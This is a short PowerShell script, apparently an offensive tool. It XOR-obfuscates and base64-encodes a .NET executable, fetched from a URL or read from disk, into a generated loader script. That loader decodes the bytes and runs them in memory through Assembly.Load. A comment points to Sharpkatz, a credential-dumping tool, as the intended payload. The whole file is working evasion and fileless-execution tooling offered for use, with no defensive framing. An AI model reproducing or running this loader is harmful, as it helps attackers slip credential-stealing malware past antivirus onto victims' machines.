param ([Parameter(Mandatory)]$namespace, $url, $binary, $out)

if ($url) { 
    $PE_binary = (Invoke-webrequest -URI $url).Content
} else {
    $PE_binary = [IO.File]::ReadAllBytes($binary)
}

if ($out) {
    $outfile = $out
} else {
    $outfile = 'payload_script.ps1'
}

$key =  @(0x7, 0x5)

$len_PE_binary = $PE_binary.length
$loop_a = [Math]::Round($len_PE_binary / 2)
$loop_b = $len_PE_binary - $loop_a

for ($i=0; $i -lt $loop_a; $i++) {
    $PE_binary[$i] = $PE_binary[$i] -bxor $key[0]
}

for ($i=$loop_a+1; $i -lt $loop_b; $i++) {
    $PE_binary[$i] = $PE_binary[$i] -bxor $key[1]
}

$encoded_PE_payload = [Convert]::ToBase64String($PE_binary)

$payload = '$content =  "' + $encoded_PE_payload + '"' + "`r`n"
$payload = $payload + '$PE_binary = [Convert]::FromBase64String($content)' + "`r`n"
$payload = $payload + '$key =  @(0x7, 0x5)' + "`r`n"
$payload = $payload + '$len_PE_binary = $PE_binary.length' + "`r`n"
$payload = $payload + '$loop_a = [Math]::Round($len_PE_binary / 2)' + "`r`n"
$payload = $payload + '$loop_b = $len_PE_binary - $loop_a' + "`r`n"
$payload = $payload + 'for ($i=0; $i -lt $loop_a; $i++) {' + "`r`n"
$payload = $payload + '    $PE_binary[$i] = $PE_binary[$i] -bxor $key[0]' + "`r`n"
$payload = $payload + '}' + "`r`n"
$payload = $payload + 'for ($i=$loop_a+1; $i -lt $loop_b; $i++) {' + "`r`n"
$payload = $payload + '    $PE_binary[$i] = $PE_binary[$i] -bxor $key[1]' + "`r`n"
$payload = $payload + '}' + "`r`n"
$payload = $payload + '$payload = [System.Reflection.Assembly]::Load($PE_binary)' + "`r`n"
$payload = $payload + $namespace # [Sharpkatz.Program]::Main("")


Set-Content -Path $outfile -Value $payload